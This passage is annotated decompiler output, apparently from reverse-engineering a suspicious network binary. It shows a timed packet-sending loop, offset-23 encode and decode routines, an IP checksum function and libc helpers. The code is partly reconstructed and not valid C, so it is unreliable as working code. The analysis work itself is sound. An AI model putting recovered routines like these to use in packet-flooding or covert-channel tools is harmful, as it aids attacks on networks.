            // sendto(Vffffff40, & Vffffffc8, 40, 0, & Vfffffff0, 16);

            if(A34 != 0) {
                if(A34 != edi) {
                    edi = edi + 1;
                    continue;
                }
                precise_sleep(300);
                edi = 0;
            } else {
                precise_sleep(300);
            }
        }
        goto L08049f30;
    }
    active_process = 0;
    esp = ebp + -216;
    return(0);
}


// could be the encoding routine
// L0804A194(A8, Ac, A10)
encode_buffer(int length, char *source_buf, char *dest_buf)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    dest_buf[0] = "";

    eax = sprintf(destbuf, "%c", source_buf[0] + 23);

    for (i = 1; i != length; i++) 
      dest_buf[i] = dest_buf[i-1] + source_buf[i] + 23;

}



//L0804A1E8(A8, Ac, A10)
decode_buffer(int length, char *source_buf, char *dest_buf)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffffc; // now tempbuf



    al = length + 3 & 252; // mask out last 2 bits to get alignment?
    esp = esp - eax; // create space for a temporary buffer on the stack
    tempbuf = esp;
    dest_buf[0] = "";

    for (i = length - 1; i >= 0; i--) {
      edx = ebx - 1;
      if(i == 0)
	eax = source_buf[0];
      else 
	eax = source_buf[i] - source_buf[i-1];

      ecx = eax - 23;
      if(ecx < 0) {
	do {
	} while(ecx = ecx + 256);
      }

      for (j = 0; j < length; j++)
	tempbuf[j] = dest_buf[j];
      
      dest_buf[0] = cl;

      for (j = 1; j < length; j++)
	  dest_buf[j] = tempbuf[j-1];
      
      eax = sprintf(dest_buf, "%c%s", ecx, tempbuf);

    }
    esp = ebp - 16;
}

// added the following from Steven's UNP Vol.1

unsigned short
in_cksum(unsigned short *addr, int len)
{

  int nleft = len;
  int sum = 0;
  unsigned short *w = addr;
  unsigned short answer = 0;

  while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }

  if (nleft == 1) {
    *(unsigned char *) (&answer) = *(unsigned char *) w;
    sum += answer;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

// last procedure that definitely does not belong to C-library

// -------------------- C Standard Library starts here ------------------

// first procedure that definitely belongs to C-library



//       Some code calls select with all three sets empty, n  zero,
//       and  a  non-null timeout as a fairly portable way to sleep
//       with subsecond precision.
//L080555B0(A8)
precise_sleep(ms)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    eax = A8;
    edx = 0;
    edx = 1000000 / 1000000 % 1000000 / 1000000;
    Vfffffff8 = eax;
    edx = (eax << 5) - eax;
    eax = ((edx << 6) - edx << 3) + Vfffffff8 << 6;
    Vfffffffc = A8 - eax;
    return(select(1, 0, 0, 0, & Vfffffff8));
}


//L080569BC(A8, Ac)
signal_action(signum, handler) {
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;

	// filling of struct sigaction: 
	// struct sigaction {
	//        union {
	//          __sighandler_t _sa_handler;
	//          void (*_sa_sigaction)(int, struct siginfo *, void *);
	//        } _u;
	//        sigset_t sa_mask;
	//        unsigned long sa_flags;
	//        void (*sa_restorer)(void);
	// };


    Vfffffff0 = Ac; // probably latter case of union 
    Vfffffff4 = 0;  // sa_mask
    Vfffffff8 = -536870912; // sa_flags: SA_NOMASK | SA_ONESHOT

    edx = -1;
    if(sigaction(A8, & Vfffffff0, & Vffffffe0) != -1) {
        edx = Vffffffe0;
    }
    return(edx);
}

